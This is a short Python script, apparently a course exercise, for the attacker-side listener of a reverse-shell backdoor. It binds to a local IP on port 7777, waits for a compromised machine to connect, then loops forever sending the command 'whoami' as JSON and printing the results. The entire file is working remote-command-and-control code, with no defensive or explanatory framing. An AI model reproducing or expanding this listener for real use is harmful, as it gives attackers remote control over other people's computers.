import socket
import json
import base64
# from json.decoder import JSONDecodeError

class SocketListener:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening... ")
        (self.my_connection, my_addr) = my_listener.accept()
        print("Connected to " + str(my_addr))

    def json_send(self, data):
        json_data_1 = json.dumps(data)
        #json_data_1_encoded = json_data_1.encode('ascii')
        self.my_connection.send(json_data_1.encode())

    def json_receive(self):
        json_data_2 = self.my_connection.recv(1024)
        #json_data_2_decoded = json_data_2.decode('ascii')
        return json.loads(json_data_2)

    def command_output_receiver(self, command_input):
        self.json_send(command_input)
        return self.json_receive()

    def command_execution(self):
        while True:
            command_input = "whoami"
            command_output = self.command_output_receiver(command_input)
            print(command_output)


Socket_listener = SocketListener("192.168.0.112", 7777)
Socket_listener.command_execution()
#Socket_listener.command_output_receiver("whoami")
